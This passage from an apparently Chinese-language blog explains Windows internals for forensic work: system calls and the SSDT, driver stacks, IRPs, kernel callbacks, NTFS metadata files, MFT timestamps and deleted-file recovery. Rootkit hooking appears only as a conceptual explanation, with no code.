内核的总处理程序接管控制权后，会查看EAX寄存器中的系统调用编号，然后利用这个编号去SSDT中查找对应的内核函数地址\n执行阶段 找到地址后，内核会跳转到该地址（例如内核中的NtWriteFile函数）去执行真正的文件写入操作\n返回阶段 内核函数执行完毕后，会将结果返回，CPU 再从内核模式切换回用户模式，应用程序继续执行\nSSDT SSDT 的全称是System Service Dispatch Table（系统服务分派表）\n它就是我们在上面流程中提到的那个函数地址查询表，它是一个存放在内核内存中的数组，数组的每一个元素都是一个函数指针，指向了实现具体系统调用的内核函数的内存地址\n当系统调用发生时，内核就是通过系统调用编号作为索引，在这个 SSDT 数组中找到并调用正确的内核函数\nSSDThook 由于 SSDT 是所有关键操作的必经之路，它成为了内核级 Rootkit 的首要攻击目标\nRootkit（通常是一个恶意的.sys驱动）会获取到 SSDT 在内存中的地址，然后用自己的恶意函数地址，去覆盖表中某个正常系统函数的地址\n比如一个文件隐藏Rootkit，可能会用自己的HookedNtQueryDirectoryFile函数地址，替换掉SSDT中原始的 NtQueryDirectoryFile（用于列出目录内容）的地址\n此后，当任何程序（包括 explorer.exe）尝试列出目录内容时，系统调用都会被重定向到这个恶意的 HookedNtQueryDirectoryFile函数这个恶意函数会先获取原始的目录列表，然后将其中所有与Rootkit自身相关的恶意文件名都过滤掉，最后再将一个“干净”的列表返回给应用程序，这样，用户就永远无法看到这些恶意文件了\n如果一个函数的地址指向的不是官方的 ntoskrnl.exe (或 win32k.sys)，而是指向了一个第三方的、可疑的驱动文件，那么就意味着SSDT已被劫持\n系统用的分类 进程与线程管理 NtCreateProcess 创建一个新进程\nNtTerminateProcess 终止一个进程\nNtCreateThread 创建一个新线程\nNtOpenProcess 打开一个已存在进程的句柄\n文件与 I/O 操作 NtCreateFile 创建或打开一个文件\nNtReadFile 从文件中读取数据\nNtWriteFile 向文件中写入数据\nNtDeviceIoControlFile 向设备驱动发送控制命令\n注册表操作 NtOpenKey 打开一个注册表项\nNtQueryValueKey 查询一个注册表键值的数据\nNtSetValueKey 设置一个注册表键值的数据\n内存管理 NtAllocateVirtualMemory 在进程的虚拟地址空间中分配内存\nNtProtectVirtualMemory 修改内存页的保护属性（如可读、可写、可执行）\n驱动 什么是驱动 驱动程序（Driver）是一个软件组件，它充当了操作系统内核与物理硬件或虚拟设备之间的通信桥梁\n当应用程序需要与硬件（如打印机、网卡、磁盘）交互时，它会向操作系统发出一个通用请求\n操作系统内核的I/O管理器接收到这个请求后，不会直接与硬件对话，而是将请求打包成IRP请求转发给相应的驱动程序\n驱动程序负责将这个标准化的请求翻译成硬件能够理解的特定指令，并与硬件通信\nCPU的特权级别 在了解驱动文件之前，我们得先知道x86架构CPU的四个特权级别\n特权级别在x86架构中也被称为保护环（Protection Rings），是CPU硬件层面实现的一种访问控制机制\nx86架构定义了四个特权级别，从Ring0到Ring3，数字越小，代表权限越高\nRing 0: 内核态（Kernel Mode） 权限：最高。运行在Ring0的代码可以执行 CPU 的所有指令集，并能直接访问任何内存地址、I/O端口和硬件设备\n运行实体: 操作系统内核本身。例如ntoskrnl.exe和绝大多数设备驱动程序(.sys 文件)\n这是操作系统的核心，负责管理系统所有资源，包括进程调度、内存管理、I/O 控制等\n如果Ring0的代码崩溃，整个系统将立即蓝屏（BSOD）或宕机（Kernel Panic）\nRing 1 \u0026amp; Ring 2: 准核心态/驱动层（Rarely Used） 权限：介于内核态和用户态之间。它们拥有比Ring3更高的权限（例如可以访问更多的 I/O 端口），但又不像Ring0那样拥有对系统的完全控制权\n运行实体: 在理论设计上，Ring1可以用于运行一些准系统级的服务，而Ring2可以用于运行设备驱动程序，从而将驱动与最核心的内核隔离开，增加系统的稳定性（即驱动崩溃不至于让整个内核崩溃）\n它几乎从未被主流消费级和服务器级操作系统（如 Windows, Linux, macOS）所使用\n这些操作系统普遍采用了更简单的两级模型，即只使用Ring0和Ring3\n这是因为在Ring1/2和Ring0之间切换上下文的开销，以及复杂的内存管理，并没有带来足够的安全收益来抵消其复杂性\nRing 3: 用户态（User Mode） 权限：最低。运行在Ring3的代码受到硬件的严格限制，它不能直接访问硬件，也不能访问属于内核或其他进程的受保护内存空间\n运行实体：所有的应用程序。例如浏览器 、记事本、游戏等，都运行在Ring3\n这是应用程序的沙箱，当一个Ring3的程序需要执行特权操作时（如读取文件），它不能直接去操作硬盘，而是必须通过一个名为系统调用的受控入口，向Ring0的内核提出请求\n内核会对请求进行验证，然后以Ring0的权限代为执行，再将结果返回给Ring1的程序\n这个过程确保了所有对关键资源的访问都在内核的掌控之下\n驱动的文件形式 .sys文件 这是最传统、最核心、权限最高的驱动程序形式，是真正的驱动\n它们是专门为在操作系统内核（Ring0）中运行而编译的，可以直接与硬件和内核数据结构交互\n几乎所有核心的硬件驱动，如磁盘驱动ntfs.sys、网络驱动tcpip.sys等，都是.sys文件\n.dll文件 它们有的情况下是驱动组件，但大多数不是传统驱动\n为了提高系统的稳定性和安全性，微软引入了用户模式驱动框架 (User-Mode Driver Framework, UMDF)\n一些对性能要求不是极致、但对稳定性要求很高的设备（如扫描仪、打印机、传感器等）的驱动，可以被实现为DLL文件\n这些驱动DLL运行在权限受限的用户模式（Ring3），并由一个系统进程（通常是svchost.exe）作为“宿主”来加载和运行\n驱动程序的分类 按运行模式分类 内核模式驱动程序 这是最常见的类型，运行在操作系统的核心层 (Ring 0)，拥有最高权限\n它们可以直接与硬件通信，是系统运行的基石\n用户模式驱动程序 运行在权限受限的用户模式 (Ring3) 下，安全性更高\n如果这类驱动程序崩溃，不会导致整个系统蓝屏\n按功能层次分类 总线驱动程序 位于驱动栈的最底层，负责枚举挂载在总线（如 PCI, USB）上的所有设备\n功能驱动程序 驱动栈的核心，通常由硬件厂商编写，负责实现设备的具体I/O功能\n筛选驱动程序 可以附加在功能驱动程序之上或之下，用于“过滤”或“修改”流经该设备的 I/O 请求\n杀毒软件的文件实时监控、磁盘加密软件等，通常就是通过它来实现的\n常见的核心系统驱动 内核核心模块 不是传统驱动，但居于内核中心\nntoskrnl.exe 它是操作系统内核本身，是所有内核活动的核心\n可以把它理解为驱动管理器和最根本的驱动，虽然它实际上并非严格意义上的设备驱动\n在系统启动时，ntoskrnl.exe会加载一系列其它核心模块（DLL 和 SYS）：\nhal.dll：硬件抽象层（HAL） kdcom.dll：内核调试通信 bootvid.dll、ci.dll：安全校验、驱动签名 各类驱动程序：acpi.sys、tcpip.sys、disk.sys等 它是整个内核态模块的中枢，所有其他的驱动程序都需要在它提供的框架内运行，并由它来管理和调度\n内核支持模块 DLL类内核组件，没有设备对象，也不处理IRP，不是传统驱动，但运行在内核态，是 OS 的底层模块\nhal.dll 硬件抽象层，屏蔽不同主板和 CPU 的差异，为内核提供统一接口\nkdcom.dll 内核调试通信模块，用于系统调试时与调试器通信\nci.dll 负责代码完整性校验与驱动签名验证\nbootvid.dll 开机阶段的简易显示输出，属于引导组件\n内核设备驱动程序 是真正严格意义上的驱动\ntcpip.sys 负责TCP/IP协议栈的核心驱动，处理所有网络数据包的收发。属于网络类驱动的代表\nntfs.sys NTFS 文件系统的核心驱动，负责硬盘上所有文件的读写和管理\n它实现了文件系统层的功能，如读写文件、挂载卷等\nacpi.sys 负责高级配置与电源管理接口（ACPI），处理系统电源管理事件，如休眠、唤醒、电源按钮等\n它属于系统级别的 ACPI 驱动\npartmgr.sys 管理磁盘的分区结构\nstorport.sys 提供与存储控制器（如 SATA、SCSI 控制器）之间的通信通道\ndisk.sys 硬盘设备驱动，处理底层磁盘I/O请求\n它与partmgr.sys、storport.sys等共同构建块设备访问层\n输入与图形类驱动 kbdclass.sys/mouclass.sys 键盘和鼠标的类驱动程序，负责处理来自这些输入设备的通用请求\n它不直接与硬件通信，而是接收底层端口驱动（如i8042prt.sys）上传的输入数据\ndxgkrnl.sys DirectX图形内核驱动，是Windows显示驱动模型（WDDM）的核心，负责与GPU交互、调度图形任务\n驱动开发支持框架模块 Wdf01000.sys Windows驱动程序框架（WDF）的一部分，是KMDF驱动的运行时组件，为许多现代驱动提供了统一的驱动模型支持\nWdfLdr.sys WDF加载器，负责驱动初始化\nWinUsb.sys WDF提供的USB驱动支持\n驱动栈 什么是驱动栈 当用户在用户层发出一个文件读写请求时，比如ReadFile(\u0026quot;D:\\\\example.txt\u0026quot;)，这个请求并不是直接送到硬盘，而是要经过多个驱动程序处理，每个驱动做自己的那一部分\n这种结构就叫驱动栈\n驱动栈的结构 下面是一个典型的Windows 存储驱动栈：\nntfs.sys（文件系统驱动） ← 顶层（用户文件访问） ↑ volmgr.sys（卷管理器驱动） ↑ partmgr.sys（分区管理器驱动） ↑ disk.sys（磁盘驱动） ↑ storport.sys（存储端口驱动） ↑ Miniport Driver（存储控制器驱动） ← 底层（控制硬件） 驱动栈工作过程 应用程序发起 I/O 请求 用户程序调用ReadFile()或WriteFile()等API，也就是进行了涉及请求访问硬件或设备的系统调用 文件系统驱动处理 ntfs.sys解析文件路径、权限等，将文件操作转换为卷层面的块设备请求 卷管理器驱动处理 volmgr.sys管理逻辑卷，确定具体的物理磁盘分区 分区管理器驱动处理 partmgr.sys负责管理磁盘分区表，转发请求到正确的物理分区 磁盘驱动处理 disk.sys负责和物理磁盘设备交互，生成适合硬件的请求 存储端口驱动处理 storport.sys是与存储控制器通信的中间层，负责协议和请求队列管理 迷你端口驱动处理 由硬件厂商编写，具体实现与存储控制器硬件的交互 硬件执行请求 最终请求被硬件执行，数据被读写 这个过程中，每一层都可以处理请求、修改请求、拦截请求，层层检查\n其它类型的驱动栈 除了存储，还有很多其他的驱动栈：\nUSB 驱动栈（简化）： usbhub.sys（USB集线器驱动） ← 顶层（最高层） ↑ usbccgp.sys（通用USB类驱动） ↑ winusb.sys（用户模式USB驱动） ↑ usbport.sys（USB端口驱动） ↑ Miniport Driver（控制器驱动） ← 底层（最接近硬件） 网络驱动栈（NDIS）： tcpip.sys（TCP/IP 协议驱动） ← 顶层（协议层） ↑ ndis.sys（NDIS 中间层驱动） ↑ Miniport Driver（网卡驱动） ← 底层（硬件驱动） 显示设备驱动栈（Windows显示驱动模型WDDM） dxgkrnl.sys（DirectX 图形内核驱动） ← 顶层（图形API接口） ↑ display.sys（显示驱动核心） ↑ Miniport Driver（显卡硬件驱动） ← 底层（显卡硬件控制） 音频设备驱动栈 audiosrv（音频服务） ← 顶层（用户模式服务） ↑ sysaudio.sys（系统音频驱动） ↑ HDAudio.sys（高定义音频驱动） ↑ Miniport Driver（声卡厂商驱动） ← 底层（硬件控制） IRP IRP 是什么 IRP的全称是I/O Request Packet，即I/O 请求包，是内核中用于描述和传递所有I/O请求的核心数据结构\n当一个I/O请求产生时，I/O管理器会创建一个IRP对象，这个IRP就像一张填写好的快递单，上面包含了所有与本次请求相关的信息，如操作类型、数据缓冲区地址、目标设备等\n之后，I/O管理器会将这张快递单发送给目标设备对应的驱动程序栈，驱动程序通过处理这些 IRP 来完成工作\n恶意软件经常通过IRP挂钩的技术来劫持系统功能，它会找到一个正常驱动的IRP处理函数地址，并将其替换为指向自己恶意代码的地址。这样，所有发往正常驱动的IRP都会先被恶意软件截胡，从而实现键盘记录、文件隐藏等功能\nIRP在驱动栈中的传递 IRP创建 应用程序调用如ReadFile()，系统调用相关内核服务，内核根据请求生成一个IRP\nIRP包含请求类型、缓冲区地址、请求参数等信息\nIRP发送到驱动栈顶层驱动 例如，磁盘驱动栈中，顶层可能是文件系统驱动（ntfs.sys）\n内核将IRP传递给顶层驱动的Dispatch函数\n驱动处理IRP 驱动检查IRP内容，执行相应操作（如文件系统解析、数据缓存等）\n驱动可以完成请求，或者决定将IRP向下传递\nIRP向下传递给下一个驱动 驱动调用IoSkipCurrentIrpStackLocation，跳过当前驱动的IRP堆栈位置\n然后调用IoCallDriver把IRP传给下一个驱动，通常是更底层的驱动\n依次传递直到最底层驱动 IRP会层层传递，直到最底层的硬件驱动处理它\n底层驱动发起对硬件的实际操作，比如读写磁盘、发送网络包\nIRP完成 硬件操作完成后，底层驱动调用IoCompleteRequest标记 IRP 完成\nIRP 结果逐层向上传递回去，每层驱动可以执行清理或后处理，最终结果反馈给系统和应用程序\n应用程序请求 ↓ IRP创建 ↓ ntfs.sys（文件系统驱动） ← 顶层 ↓ 传递IRP volmgr.sys（卷管理器驱动） ↓ 传递IRP partmgr.sys（分区管理驱动） ↓ 传递IRP disk.sys（磁盘驱动） ↓ 传递IRP storport.sys（存储端口驱动） ↓ 传递IRP Miniport Driver（硬件控制驱动） ← 底层 ↓ 硬件操作 硬件设备完成请求 ↓ 结果返回 Miniport Driver ↓ 返回 storport.sys ↓ 返回 disk.sys ↓ 返回 partmgr.sys ↓ 返回 volmgr.sys ↓ 返回 ntfs.sys ↓ 返回 操作系统 常见IRP主要功能码 每个IRP都包含一个主要功能码，用于定义本次请求的核心操作类型\n文件与设备管理 IRP_MJ_CREATE 打开或创建文件、设备句柄\nIRP_MJ_CLOSE 关闭文件或设备句柄\nIRP_MJ_READ 从文件或设备读取数据\nIRP_MJ_WRITE 向文件或设备写入数据\nIRP_MJ_QUERY_INFORMATION 查询文件或设备信息（大小、属性等）\nIRP_MJ_SET_INFORMATION 设置文件或设备信息（修改属性等）\n设备控制 IRP_MJ_DEVICE_CONTROL 向驱动发送自定义控制命令（用户模式到驱动的常用命令）\nIRP_MJ_INTERNAL_DEVICE_CONTROL 驱动间内部控制命令，供驱动程序之间通信使用\n即插即用（PnP） IRP_MJ_PNP 即插即用事件通知，如设备启动、停止、移除、资源分配等\n电源管理 IRP_MJ_POWER 电源状态管理请求，如休眠、唤醒、电源状态改变等\n文件系统控制 IRP_MJ_FILE_SYSTEM_CONTROL 文件系统特定控制请求，如卷挂载、卸载等\n系统管理 IRP_MJ_SHUTDOWN 系统关机或重启时通知驱动准备关闭\nIRP_MJ_CREATE_MAILSLOT 创建邮件槽（用于进程间通信）\nIRP_MJ_QUERY_SECURITY 查询安全描述符\nIRP_MJ_SET_SECURITY 设置安全描述符\n其他常见功能码 IRP_MJ_QUERY_VOLUME_INFORMATION 查询卷信息\nIRP_MJ_SET_VOLUME_INFORMATION 设置卷信息\nIRP_MJ_CLEANUP 清理（关闭时，释放资源等）\n内核回调 什么是内核回调 内核回调（Kernel Callbacks） 是一种事件驱动的机制\n它允许内核模式的驱动程序向操作系统内核注册特定的系统级事件，当这些被注册的事件发生时，内核会暂停其正常操作流程，并逐一回调所有已注册的驱动程序提供的函数，即回调例程\n这是内核提供的一个事件通知系统，驱动程序不再需要通过不断轮询的方式来检查某个状态是否改变，而是可以被动地、在事件发生时才被内核精准地唤醒和调用\n示例（用户态）：\nvoid OnButtonClick() { printf(\u0026#34;按钮被点击！\\n\u0026#34;); } RegisterButtonCallback(OnButtonClick); // 注册回调 系统中，“按钮被点击”事件发生后，会自动调用注册的OnButtonClick()函数\n内核回调工作过程 注册 在驱动程序的初始化阶段（通常是在DriverEntry函数中），驱动程序会调用一个由内核导出的、特定于事件类型的注册函数。例如，要监控进程创建，驱动程序会调用PsSetCreateProcessNotifyRoutine\n在调用时，驱动程序会将一个指向自己内部实现的回调函数的地址，作为一个参数传递给内核\n内核接收到这个请求后，会将这个函数地址添加到一个与该事件类型相关联的、内部维护的回调函数指针链表中\n触发 当一个被订阅的系统事件发生时（例如NtCreateUserProcess系统调用被执行以创建一个新进程），内核在完成其核心操作的某个特定阶段，会暂停下来\n调用 内核会找到与该事件对应的回调函数指针链表，然后，它会依次遍历这个链表，并同步地调用每一个已注册的回调函数\n内核会将与事件相关的上下文信息（例如，对于进程创建事件，会传递新进程的PID、创建者信息等）作为参数传递给回调函数\n处理 驱动程序的回调函数被调用后，便可以在其函数体内执行自定义的逻辑\n它可以仅仅记录该事件，也可以进行干预，例如阻止该事件的完成（如果回调类型允许的话）\n常见内核回调 进程与线程相关回调 PsSetCreateProcessNotifyRoutine 功能：当进程创建或退出时触发 用途：监控进程行为（如杀毒软件、行为分析等） PsSetCreateThreadNotifyRoutine 功能：当线程被创建或销毁时触发 用途：检测线程注入、远程线程创建 映像加载相关回调 PsSetLoadImageNotifyRoutine 功能：当模块（如EXE、DLL）被加载到进程时触发 用途：监视DLL是否注入或加载非法模块 注册表操作回调 CmRegisterCallback/CmRegisterCallbackEx 功能：在注册表被访问（读写、删除等）时触发 用途：拦截修改注册表、保护启动项 文件系统监控回调 FsRtlRegisterFileSystemFilterCallbacks 功能：文件系统过滤驱动使用的回调注册接口 用途：监视文件访问、隐藏或加密文件等（如勒索软件防护、杀毒软件） 电源管理与关机回调 IoRegisterShutdownNotification 功能：注册系统关机前通知 用途：清理资源、保存数据、记录日志 PoRegisterPowerSettingCallback 功能：注册电源策略变化回调（如睡眠、唤醒） 用途：管理节能策略或唤醒唤醒设备 蓝屏 (BugCheck) 回调 KeRegisterBugCheckCallback 功能：系统蓝屏前调用，允许驱动记录崩溃状态 用途：记录调试信息、保存崩溃快照 Windows事件通知类回调 ExRegisterCallback 功能：内核模块之间广播通知 用途：驱动之间共享事件信息（如热插拔、电池状态） 网络相关回调 FwpsCalloutRegister 功能：用于网络过滤和处理框架Windows Filtering Platform注册网络流量过滤回调 用途：监控/拦截网络通信（如防火墙、DLP系统） NdisRegisterProtocolDriver 功能：注册协议驱动的接收/发送回调函数 用途：网络监控、抓包、VPN实现等 安全与对象管理回调 ObRegisterCallbacks 功能：监控对象句柄操作，如进程句柄、线程句柄 用途：防止进程被调试、注入、终止（常用于反作弊或病毒保护） ","date":"2025-07-21T12:18:54+08:00","image":"http://picture.928330.xyz/typora/628735","permalink":"https://blog.928330.xyz/p/windows%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93%E4%B8%8B/","title":"windows相关知识总结（下）"},{"content":"写下这篇文章的原因是因为最近在学习电子取证，使用Volatility多少得看得懂输出才行\n现在只是大概的了解，如果后续有时间，会把每一个板块都单独拿出来学习的\n嗯，如果有时间的话\nwindows相关知识总结（下）：\nhttp://blog.928330.xyz/p/windows%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93%E4%B8%8B/ NTFS文件系统 什么是NTFS NTFS，全称New Technology File System，是自WindowsNT以来微软所有现代操作系统的标准文件系统\n在NTFS卷上，一切皆文件\n这不仅包括我们日常所见的普通文件和目录，用于描述和管理文件系统自身的元数据也同样被组织成一系列特殊的文件，这种设计极大地增强了文件系统的灵活性和可恢复性\n核心元文件 这是NTFS文件系统内部使用的一组以$开头的特殊隐藏文件，用于维护整个文件系统的结构、状态和完整性\n它们不像普通用户文件那样可见或可操作，而是被NTFS在后台自动创建和管理，保存着关于文件、目录、磁盘空间、日志、安全信息等的元数据\n大致结构如下：\nNTFS Root ├── $Mft ├── $MftMirr ├── $LogFile ├── $Volume ├── $Bitmap ├── $BadClus ├── $AttrDef ├── $Secure ├── $Extend │ ├── $Quota │ ├── $ObjId │ ├── $Reparse │ └── $UsnJrnl ├── $UpCase ├── $Boot └── ... $Mft MFT，即主文件表，是NTFS文件系统的核心数据库\n它本身是一个特殊文件，由一系列固定大小的文件记录（通常为1024字节）组成\n卷上的每一个文件和目录都至少对应MFT中的一个文件记录，该记录包含一个头部和一系列描述文件所有信息的属性\n它的主要用途是作为整个卷的索引目录\n操作系统进行任何文件操作（如查找、读取、写入、权限检查）时，都必须首先查询$Mft以获取文件的元数据，包括时间戳、大小、权限以及数据在磁盘上的物理位置\n我们后面会详细说明它：[MFT](#NTFS的关键结构 —— 主文件表MFT)\n$MftMirr MftMirr是主文件表的一个部分备份或镜像\n它通常只包含Mft最开头的几个关键文件记录（例如描述Mft自身、LogFile等元文件的记录）\n为了提高容灾能力，它在物理磁盘上的存储位置通常远离Mft\n其唯一的用途是文件系统恢复\n当Mft文件的起始部分发生损坏导致文件系统无法挂载时，操作系统可以利用MftMirr来定位关键的元文件，从而为修复工具提供恢复文件系统的可能性\n$LogFile 该文件是NTFS日志记录功能的物理载体\n它遵循预写式日志模型，即在对文件系统元数据进行任何实际更改之前，都会先将描述该操作的事务日志记录写入LogFile\n它的核心用途是保证文件系统的一致性和可恢复性\n在系统意外崩溃或断电后，NTFS驱动程序可以通过检查LogFile，回滚未完成的事务或完成已记录但未写入的事务，从而防止文件系统结构损坏，也可以用来恢复最近的文件操作历史\n$Volume 这是一个存储卷级别信息的元文件\n它的主要属性中包含了整个卷的元数据，例如卷标、NTFS版本号以及卷的状态标志位\n操作系统使用此文件来识别卷的属性\n其中脏位(Dirty Bit)尤为重要，表示某个数据结构或内存页是否已经被修改过但尚未写回到磁盘或永久存储中，系统在启动时会检查这个标志，如果发现上次关机是“非正常”的，就会触发chkdsk等磁盘检查工具来确保卷的一致性\n$Bitmap Bitmap是一个位图文件，它的每一个比特位都精确地对应着卷上的一个物理簇\n比特位的值（0或1）用于标记其对应的簇是空闲的还是已被占用\n它被文件系统用于高效地管理磁盘空间分配\n当需要为新文件写入数据时，系统会查询Bitmap来快速找到连续的空闲簇\n当文件被删除时，其占用的簇对应的比特位会被重置为0（空闲）\n$BadClus 该文件标记了卷上所有已被检测为物理损坏或不可靠的坏簇\n它以一个稀疏文件的形式存在，其$DATA属性中包含了所有坏簇的位置列表\n它的作用是防止数据丢失\n文件系统在分配磁盘空间时，会避开BadClus文件中标记的所有簇，以确保用户数据不会被写入到这些已知的物理损坏区域\n$AttrDef AttrDef是属性定义表，相当于MFT文件记录的模式或模板定义文件\n它以结构化的形式，列出了NTFS文件系统支持的所有属性类型及其元数据，包括它们的名称、数字ID以及默认特性（如是否可以非常驻）\n此文件由NTFS驱动程序在内部使用，用于在解析任何MFT文件记录时，都能正确地识别和解释其中的各种属性结构，保证了MFT的结构完整性和可扩展性\n$Secure 这是一个集中存储卷上所有文件和目录的安全描述符的数据库\nNTFS为了节省空间，并不会在每个MFT记录中都存一份完整的安全描述符（包含用户SID、权限ACL等），而是将唯一的描述符存储在Secure文件中，并赋予其一个ID\n其他MFT记录只需引用这个ID即可\n主要用途是提高权限验证效率和降低安全信息的存储冗余\n通过共享安全描述符，可以显著减小MFT的体积，并允许系统更高效地缓存和查询权限信息\n$Extend Extend本身是一个目录，它作为NTFS高级功能模块的扩展容器，其下包含了多个用于支持特定功能的元文件\n它为磁盘配额、对象ID、重解析点和变更日志等高级功能提供结构化的存储位置\n它包含以下重要子文件：\n$Quota 用于记录和管理每个用户在该卷上的磁盘空间使用限制\n它以包含用户SID、空间使用量、警告阈值和硬限制等信息的结构化记录进行存储\n实现Windows的磁盘配额功能，允许管理员为不同用户设置不同的磁盘空间上限\n$ObjId 为一个卷上的每个文件分配一个全局唯一的对象标识符（GUID），以便快速查找\n主要被分布式链接跟踪等系统服务使用，确保即使用户将文件移动或重命名，依赖该文件的快捷方式等依然能找到它\n$Reparse 记录了卷上所有设置了重解析点的文件或目录\n重解析点允许一个文件或目录的访问被一个特定的驱动程序拦截并进行特殊处理\n它是实现多种高级文件系统功能的基础，例如符号链接、目录联接、卷挂载点以及OneDrive的占位符文件等\n$UsnJrnl 其全称为Update Sequence Number Journal，即更新序列号日志\n它是一个高效率的日志，记录了卷上所有文件的所有变更事件，如创建、删除、写入、重命名、权限修改等\n它的主要用户是需要监控文件系统变化的应用程序，如增量备份软件、文件同步服务、以及安全审计工具。在取证分析中，它是还原文件详细活动历史的最重要数据源之一\n$Boot 该文件是卷的引导扇区的一个精确副本\n它包含了BIOS参数块，详细描述了该分区的物理布局，以及用于启动操作系统的初始引导代码\n其核心用途是在计算机启动时，由BIOS/UEFI读取并执行，以加载操作系统的引导加载程序\n同时，NTFS驱动程序也需要读取它来理解卷的几何结构\n$UpCase 该文件包含了一个完整的、将所有Unicode字符映射到其对应大写形式的转换表，用于实现NTFS文件名大小写不敏感但大小写保留的特性\n当进行文件名比较或查找时，文件系统会调用这个映射表来确保file.txt和FILE.TXT这样的大小写被视为同一个文件\n$Recycle.Bin 这虽然不是一个元数据文件，但它是一个与文件系统紧密相关的、重要的系统隐藏目录\n当用户通过图形界面删除文件时，文件并不会被物理删除，而是其MFT记录被修改，使其被移动到Recycle.Bin目录下某个以用户SID命名的子目录中，并被重命名，同时一个索引文件会记录下原始的文件名和路径\n它为用户提供回收站功能，允许恢复被误删除的文件\nNTFS的关键结构 —— 主文件表MFT 什么是MFT MFT的全称是MasterFileTable ，即主文件表，它是NTFS文件系统的核心\n如果NTFS格式的硬盘分区是图书馆，那么MFT就是这个图书馆的总目录卡片索引柜\n这个索引柜本身也是一个特殊的文件，名为$MFT，里面存放着一张张的卡片，每一张卡片都详细记录了图书馆里某一本书（即硬盘上的一个文件或文件夹）的所有信息\n没有这个总目录，操作系统就无法找到、访问或管理分区上的任何文件\nMFT 的结构 文件记录 MFT 由一系列固定大小的文件记录构成，每个记录都有一个唯一的编号，从 0 开始\n记录的前部是固定的头结构FILE_RECORD_SEGMENT_HEADER，用于描述该记录的状态（如是否在使用中）\n其余部分则由多个可变长度的属性组成\n核心属性 每个文件记录内部，由多个不同类型的属性来完整描述一个文件，下面介绍几个关键属性：\n$STANDARD_INFORMATION (0x10)\n这是存储文件的核心元数据，包括安全描述符、所有者ID，以及一组MACE时间戳\n这组时间戳与文件内容的改变紧密相关，被认为是最稳定的时间戳，其创建时间通常反映了文件数据首次被写入的时间，是构建原始时间线的基准，常被称为MAC(B)时间\n1. M - Modified (修改时间) —— 文件内容最后一次被修改的时间\n当打开一个文件，编辑其内容并保存后，这个时间戳就会更新\n创建新文件时，它的修改时间与创建时间相同\n2. A - Accessed (访问时间) —— 文件内容最后一次被访问读取的时间\n理论上，只要一个程序打开并读取了文件内容（即使没有修改），这个时间戳就应该更新。\n但是在现代Windows系统中（Vista及之后），为了提高性能，默认情况下访问时间的更新是禁用的，因此这个时间戳的参考价值有限，除非管理员手动开启了该功能\n3. C - Created (创建时间) —— 文件被创建在这个文件系统上的时间\n当一个文件从一个地方复制到另一个地方时，新文件的“创建时间”是复制操作发生的时间，而不是原始文件的创建时间\n但当文件被移动到同一卷（例如从C盘的一个文件夹移动到另一个文件夹）时，创建时间通常不会改变\n4. E - Entry Modified (MFT记录变更时间) —— 该文件在MFT中的记录本身最后一次被修改的时间\n任何导致文件元数据发生变化的操作都会更新这个时间戳，例如文件重命名、文件大小改变、权限修改等。当然，修改文件内容（更新Modified时间）也同样会更新这个时间戳\n$FILE_NAME (0x30)\n包括存储文件名、父目录的文件记录号、文件大小，以及另一组独立的MACE时间戳\n这组时间戳反映的是文件名属性本身的状态，当文件被创建、移动或重命名时，这组时间戳会被更新\n通过对比$STANDARD_INFORMATION和$FILE_NAME两组时间戳的差异，可以用来判断文件是原地创建还是从别处复制而来\n一个文件记录可以有多个$FILE_NAME属性，以支持长文件名、MS-DOS兼容的8.3短文件名与硬链接\n这两组时间具体变化情况如下表(访问时间在现代Windows系统中默认禁用更新，因此假设其始终不变)：\n操作 属性 创建时间 (C) 修改时间 (M) 访问时间 (A) MFT变更时间 (E) 原地创建文件 $STANDARD_INFORMATION ✅ ✅ ❌ ✅ $FILE_NAME ✅ ✅ ❌ ✅ 修改文件内容 $STANDARD_INFORMATION ❌ ✅ ❌ ✅ $FILE_NAME ❌ ✅ ❌ ✅ 复制文件 $STANDARD_INFORMATION ❌ (继承) ❌ (继承) ❌ ✅ $FILE_NAME ✅ ✅ ❌ ✅ 移动文件 (同一分区) $STANDARD_INFORMATION ❌ ❌ ❌ ❌ $FILE_NAME ❌ ❌ ❌ ✅ 重命名文件 $STANDARD_INFORMATION ❌ ❌ ❌ ❌ $FILE_NAME ❌ ❌ ❌ ✅ 读取文件 $STANDARD_INFORMATION ❌ ❌ ❌ ❌ $FILE_NAME ❌ ❌ ❌ ❌ $DATA\n其中存储着文件的实际数据，其存储方式有两种：\n常驻数据（存内容）：如果文件非常小（通常小于约700字节），其全部数据会直接存储在 MFT 记录内部的$DATA属性中，无需到磁盘的其他地方去寻找 非常驻数据（存指针）：如果文件较大，$DATA属性中存储的则是数据运行/簇列表，这是一系列指针，详细描述了该文件的数据流在磁盘上占用了哪些不连续的簇 $ATTRIBUTE_LIST\n它包含一个指针列表，指向存储该文件其他属性的额外MFT记录\n当一个文件的所有属性无法在一个MFT记录中存下时（例如，文件有极多的硬链接或高度碎片化），系统会创建这个属性\nMFT与文件恢复 当一个文件被删除时，NTFS的操作是：\n在 MFT 中找到该文件对应的记录，并将其头部的in-use标志位置为0（未使用），记录本身的内容并不会被立即清除 在$Bitmap文件中（跟踪卷上所有簇使用情况的元文件），将该文件数据所占用的磁盘簇标记为未分配 这种标记删除机制使得数据恢复成为可能，恢复的成功率取决于MFT记录和原始数据簇是否被后续写入的新文件所覆盖\n这就导致下面几种情况：\n恢复场景 MFT记录状态 文件数据状态 可恢复性 最佳情况 完好 完好 完美恢复：文件名、元数据和文件内容全部可以恢复 一般情况 完好 部分被覆盖 部分恢复：文件名和元数据可恢复，但文件内容不完整或已损坏 情况三 完好 完全被覆盖 仅元数据恢复：只能恢复文件名、大小、时间戳等“档案”信息，文件内容永久丢失 最差情况 被覆盖 完好或部分完好 部分恢复：文件名和元数据永久丢失，但文件内容本身可以从磁盘的“未分配空间”中被恢复出来 常驻数据 完好 数据在MFT记录中 完美恢复：由于文件数据本身就存储在MFT记录中，只要MFT记录未被覆盖，即使磁盘数据区被重写，文件内容依然可以被完整恢复 注册表 什么是注册表 Windows注册表是整个操作系统的核心数据库，是一个庞大、复杂的层级式数据库\n它存储了操作系统和几乎所有应用程序运行所需的全部配置信息，从硬件驱动的设置、软件的安装路径，到桌面壁纸的图片位置，所有的一切都记录在其中\n如何打开注册表 我们可以使用注册表编辑器：\nwin+R打开运行窗口，输入regedit，Shift+Ctrl+Enter以管理员模式打开\n除了直接看注册表，它还有一个简单易用的用户界面——本地组策略，只不过家庭版通常是没有的：\nwin+R打开运行窗口，输入gpedit.msc打开\n注册表的结构 